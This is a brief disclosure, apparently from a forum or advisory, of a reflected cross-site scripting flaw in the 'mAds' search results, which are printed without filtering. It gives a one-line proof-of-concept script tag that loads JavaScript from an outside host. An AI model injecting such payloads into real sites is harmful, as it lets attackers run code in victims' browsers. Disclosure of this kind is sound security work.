*Searching

XSS vuln when searching:

Like the hotbot XSS vuln, when searching mAds returns with its results they are generated dynamically on screen, with no filtering at all. For a PoC as your search string put in:

<script src=http://www.youfucktard.com/xss.js></script>

Screenshots:

Im sure other vulnerabilities aside from XSS could be also possible due to this.
